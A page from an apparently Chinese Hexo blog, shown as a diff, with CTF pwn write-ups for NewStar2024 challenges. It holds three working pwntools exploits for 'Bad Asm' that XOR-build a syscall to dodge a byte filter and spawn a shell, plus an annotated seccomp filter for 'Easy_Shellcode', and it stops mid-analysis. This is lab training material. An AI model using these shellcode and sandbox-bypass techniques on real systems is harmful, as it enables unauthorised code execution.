@@ -1,0 +1,1103 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="【pwn】newstar2024 Bad Asm考点代码试图阻止用户使用syscall和sysenter指令，但允许其他指令 看来是检查绕过方面的内容 分析就一个文件，先看看护盾   IDA启动   “ERROR \\ Unavailable ! : syscall&#x2F;sysenter&#x2F;int 0x80”  过滤了syscall &#x2F; sysenter &#x2F; in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar2024">
+<meta property="og:url" content="http://example.com/2026/04/22/NewStar2024/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="【pwn】newstar2024 Bad Asm考点代码试图阻止用户使用syscall和sysenter指令，但允许其他指令 看来是检查绕过方面的内容 分析就一个文件，先看看护盾   IDA启动   “ERROR \\ Unavailable ! : syscall&#x2F;sysenter&#x2F;int 0x80”  过滤了syscall &#x2F; sysenter &#x2F; in">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762584942437-61ce86df-24f8-49d1-bb98-e09a66e1f6c6.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762585107306-555931f9-e3e2-4ac1-91e7-9254eb71e7ad.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762598529330-bc7014b0-dbf5-4980-aa30-e65f82511d76.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762598594379-8c0b89fa-1aeb-440a-b3f8-3f99e61bc548.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762607503506-d9265f9b-c250-4be0-8469-7a9c2744c836.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762612675335-4dafa0f7-4274-4aec-9f45-a26f2a051b25.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762613211694-102633cc-e562-4e53-92b2-87c67afee936.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762615596311-784c111b-b9d2-433d-8e45-8a5972d2aaef.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762615746949-ec9f7a98-f7e6-4b5f-a109-5bd5f191d08f.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762666186510-2bbc2d45-dc0f-47db-94fe-1727cdd70c11.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762670165559-5882fa9e-7bb1-43bb-acb0-8f4dca79066a.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762671171906-4e73685a-8a6a-47ea-af2e-13b7e22b22ed.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762671537367-de911630-6a13-4dc6-ac29-15289909e84b.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762879263811-b355deef-bc0f-48bb-9cdf-28684ab34fc8.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762962374892-c2c25f39-514d-4832-87bf-15d7d5436adf.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1762962396351-6ac5a230-4b7e-4310-9d5d-6f7832335fc6.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763019426890-954394d5-9533-439e-a74b-5398ef19901d.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763019555642-428ffcd9-b0d9-4fd1-8d19-578e99887fa0.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763274441832-d3615a7c-d0a1-484e-80fc-9c04f47c7cac.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763274450005-d4772d45-8628-44b8-8c95-f27f5c715bc4.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763274458381-0a880252-9e38-4def-9796-9597d4255010.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763274841580-dd7de2b0-22f7-44fd-b89c-2589d937da33.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763275992704-356452af-d6df-4c64-a90e-1a52c7cbbf28.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763277726780-83c38e0d-03c4-4043-bf8b-81fb0b2d250e.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763278391615-c4cab259-b777-489c-974c-86699301aa16.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763286436677-88b57f85-1f0b-4701-8953-5d13a07a0fc5.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763279365978-4a63e104-4ccc-4149-9655-c248b4faac4b.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1763362618240-f801c6e7-bcea-4572-9069-a4a6d28d897f.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1764083254650-2d167794-1e54-4b16-8910-1c177870b1b5.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1764052763376-30943230-9a2a-403f-878c-0e507a527746.png">
+<meta property="og:image" content="http://example.com/images/NewStar2024/1764674912365-20e27879-831a-48d1-a972-d4aac1b338b8.png">
+<meta property="article:published_time" content="2026-04-21T17:18:02.000Z">
+<meta property="article:modified_time" content="2026-04-21T17:20:20.488Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/NewStar2024/1762584942437-61ce86df-24f8-49d1-bb98-e09a66e1f6c6.png">
+  
+  
+  
+  <title>NewStar2024 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NewStar2024"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-22 01:18" pubdate>
+          2026年4月22日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          116 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NewStar2024</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="【pwn】newstar2024-Bad-Asm"><a href="#【pwn】newstar2024-Bad-Asm" class="headerlink" title="【pwn】newstar2024 Bad Asm"></a>【pwn】newstar2024 Bad Asm</h2><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>代码试图阻止用户使用<code>syscall</code>和<code>sysenter</code>指令，但允许其他指令</p>
+<p>看来是检查绕过方面的内容</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>就一个文件，先看看护盾</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762584942437-61ce86df-24f8-49d1-bb98-e09a66e1f6c6.png" srcset="/img/loading.gif" lazyload></p>
+<p>IDA启动</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762585107306-555931f9-e3e2-4ac1-91e7-9254eb71e7ad.png" srcset="/img/loading.gif" lazyload></p>
+<p>“ERROR \\ Unavailable ! : syscall&#x2F;sysenter&#x2F;int 0x80”</p>
+<p> 过滤了<code>syscall</code> &#x2F; <code>sysenter</code> &#x2F; <code>int 0x80</code> 的汇编指令的机器码  </p>
+<p>使用<code>mmap</code>分配可执行内存，绕过了数据执行保护（DEP），使得shellcode能够执行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762598529330-bc7014b0-dbf5-4980-aa30-e65f82511d76.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是一个无限递归的strcpy实现，会导致栈溢出崩溃</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762598594379-8c0b89fa-1aeb-440a-b3f8-3f99e61bc548.png" srcset="/img/loading.gif" lazyload></p>
+<p>接受一个函数指针 <code>a1</code> 和参数 <code>a2</code>，并使用多个零值参数调用该函数指针</p>
+<p><code>exec(dest)</code>将<code>dest</code>的内容当作函数指针执行</p>
+<h3 id="方案："><a href="#方案：" class="headerlink" title="方案："></a>方案：</h3><p>1.read二次加载，分段执行</p>
+<p><strong>执行流程</strong>：</p>
+<ol>
+<li>恢复rsp，使其指向可读写内存区域</li>
+<li>使用异或运算动态生成<code>syscall</code>指令(0x0f05)</li>
+<li>将syscall写入shellcode末尾</li>
+<li>调用read等待用户输入第二阶段shellcode</li>
+<li>第二阶段shellcode直接包含execve(“&#x2F;bin&#x2F;sh”,0,0)</li>
+</ol>
+<p>2.直接execve调用</p>
+<p>3.栈上执行syscall</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>1.read二次加载，分段执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python3<br>from pwn import *<br><br>context.log_level = &#x27;info&#x27;<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)<br><br>p = remote(&#x27;127.0.0.1&#x27;, 39273) <br>    <br># 第一阶段shellcode：设置栈指针并准备read调用<br>stage1 = &#x27;&#x27;&#x27;<br>    mov rsp, rdi<br>    mov rax, rdi<br>    add sp, 0x0848<br>    <br>    mov rsi, rdi<br>    mov dx, 0x3fff<br>    <br>    mov cx, 0x454f<br>    xor cx, 0x4040<br>    add al, 0x40<br>    mov [rax], cx<br>    <br>    xor rdi, rdi<br>    xor rax, rax<br>    &#x27;&#x27;&#x27;<br>    <br>    # 发送第一阶段shellcode，用nop填充到0x40字节<br>p.sendafter(&quot;Input your Code :&quot;, asm(stage1).ljust(0x40, b&#x27;\x90&#x27;))<br>    <br>    # 第二阶段：发送真正的execve shellcode<br>    # 0x42个&#x27;a&#x27;用于覆盖第一阶段shellcode和nop<br>payload = b&#x27;a&#x27; * 0x42 + asm(shellcraft.sh())<br>p.send(payload)<br>    <br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762607503506-d9265f9b-c250-4be0-8469-7a9c2744c836.png" srcset="/img/loading.gif" lazyload></p>
+<p>success</p>
+<p>2.直接execve调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br> <br>context.log_level=&#x27;debug&#x27;<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)<br>context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]<br> <br>p = remote(&#x27;127.0.0.1&#x27;, 39273) <br><br>shellcode=&#x27;&#x27;&#x27;<br>mov rsp, rdi<br>add sp, 0x0848   ; //  给rsp一个合法值，使程序能正常执行push/pop，同时增加0x848字节的栈空间，避免覆盖重要数据<br>mov rsi, 0x4028636f2e49226f<br>mov rdx, 0x4040104040204040<br>xor rsi, rdx   <br>push rsi     ; // 异或搓出来&#x27;/bin/sh\x00&#x27;(正好 8 字节，一个寄存器能存下) 并 push 到栈上面<br> <br>mov ax, 0x454f   ; // AX = 0x454f<br>xor ax, 0x4040    ; // 0x454f XOR 0x4040 = 0x050f<br>mov rsi, rdi      ; // RSI = RDI<br>add sil, 0x40    ; // RSI 的低字节加 0x40<br>mov [rsi], ax  ; // 搓出来 syscall 的机器码 0f 05 并且拼接到当前 shellcode 后面<br> <br>mov rdi, rsp   ; // 设置 rdi,指向之前 push 到栈上面的 &#x27;/bin/sh\x00&#x27;<br>xor rsi, rsi   ; // rsi = 0<br>xor rdx, rdx   ; // rdx = 0<br>xor rax, rax   ; // rax = 0<br>mov al, 59     ; // syscall: execve<br>&#x27;&#x27;&#x27;<br>p.sendafter(&quot;Input your Code :&quot;, asm(shellcode).ljust(0x40, b&#x27;\x90&#x27;))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762612675335-4dafa0f7-4274-4aec-9f45-a26f2a051b25.png" srcset="/img/loading.gif" lazyload></p>
+<p>success</p>
+<p>3.栈上执行syscall</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>context.log_level = &#x27;info&#x27;<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)<br><br>p = remote(&#x27;127.0.0.1&#x27;, 39273) <br>shellcode = &#x27;&#x27;&#x27;<br>    mov rsp, rdi<br>    add sp, 0x0848<br>    <br>    ; //构造&quot;/bin///sh&quot;字符串（用了三个斜杠,是为了对齐,避免空字节,多余的斜杠在Linux中不会影响执行）<br>    push 0x68<br>    mov rax, 0x732f2f2f6e69622f<br>    push rax<br>    <br>    ; //设置execve参数等效execve(&quot;/bin/sh&quot;, NULL, NULL)<br>    mov rdi, rsp   ; //文件名参数 -&gt; &quot;/bin///sh&quot;<br>    xor rsi, rsi    ; //argv参数 -&gt; NULL,在简单shellcode中通常设为NULL以减少复杂性<br>    xor rdx, rdx      ; //envp参数 -&gt; NULL,在简单shellcode中通常设为NULL以减少复杂性<br>    xor rax, rax<br>    mov al, 59     ; //系统调用号 -&gt; execve(59)<br>    <br>    ; //在栈上生成syscall指令<br>    mov cx, 0xf5ff<br>    xor cx, 0xf0f0<br>    push rcx<br>    jmp rsp<br>    &#x27;&#x27;&#x27;<br>    <br>    # 直接发送shellcode，不需要nop填充<br>p.sendafter(&quot;Input your Code :&quot;, asm(shellcode))<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762613211694-102633cc-e562-4e53-92b2-87c67afee936.png" srcset="/img/loading.gif" lazyload></p>
+<p>success</p>
+<h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>开眼了，还能用动态构造的方式植入syscall指令</p>
+<h2 id="【pwn】newstar2024-Easy-Shellcode"><a href="#【pwn】newstar2024-Easy-Shellcode" class="headerlink" title="【pwn】newstar2024 Easy_Shellcode"></a>【pwn】newstar2024 Easy_Shellcode</h2><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>出题人给了点提示</p>
+<p>“ 呐呐 ~ 雑魚哥哥不会这样就被小小沙箱捉弄的不会说话了吧 ♡ 真是弱哎 ♡~  ”</p>
+<p>看来是<code>sandbox</code>方面的内容</p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我管你这儿那的，先看看护盾😋</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762615596311-784c111b-b9d2-433d-8e45-8a5972d2aaef.png" srcset="/img/loading.gif" lazyload></p>
+<p>还行</p>
+<p>IDA启动！</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762615746949-ec9f7a98-f7e6-4b5f-a109-5bd5f191d08f.png" srcset="/img/loading.gif" lazyload></p>
+<p>find “sandbox();”</p>
+<p>点进去发现是好长一串，看来用IDA看这个不合适</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762666186510-2bbc2d45-dc0f-47db-94fe-1727cdd70c11.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0000: 0x20 0x00 0x00 0x00000004  A = arch<br>0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009<br></code></pre></td></tr></table></figure>
+
+<p>只允许 x86_64 架构的程序运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plain">0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005<br>0004: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 execve (59/0x3b)<br><br>0005: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0007  <br>0006: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 execveat (322/0x142)<br><br>0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009<br>0008: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 open (2)<br><br>0011: 0x15 0x00 0x01 0x000001b5  if (A != 437) goto 0013<br>0012: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止系统调用 437 (可能是 tkill)<br><br>0013: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0015<br>0014: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 read (0)<br><br>0015: 0x15 0x00 0x01 0x00000013  if (A != 19) goto 0017<br>0016: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 readv (19)<br><br>0017: 0x15 0x00 0x01 0x00000127  if (A != 295) goto 0019<br>0018: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止系统调用 295 (可能是 preadv)<br><br>0021: 0x15 0x00 0x01 0x00000011  if (A != 17) goto 0023<br>0022: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 pread64 (17)<br><br>0023: 0x15 0x00 0x01 0x00000001  if (A != 1) goto 0025<br>0024: 0x06 0x00 0x00 0x00000000  return KILL<br># 禁止 write (1)<br></code></pre></td></tr></table></figure>
+
+<p><strong>禁止传统文件操作</strong>：<code>open</code>, <code>read</code>, <code>write</code></p>
+<p><strong>禁止执行新程序</strong>：<code>execve</code>, <code>execveat</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">0009: 0x15 0x00 0x01 0x00000101  if (A != 257) goto 0011<br>0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br># 允许 openat (257)<br><br>0019: 0x15 0x00 0x01 0x00000147  if (A != 327) goto 0021<br>0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br># 允许 preadv2 (327)<br><br>0025: 0x15 0x00 0x01 0x00000014  if (A != 20) goto 0027<br>0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br># 允许 writev (20)<br><br>0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br># 默认允许其他所有系统调用<br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以使用 <code>openat</code> (257) 代替 open</p>
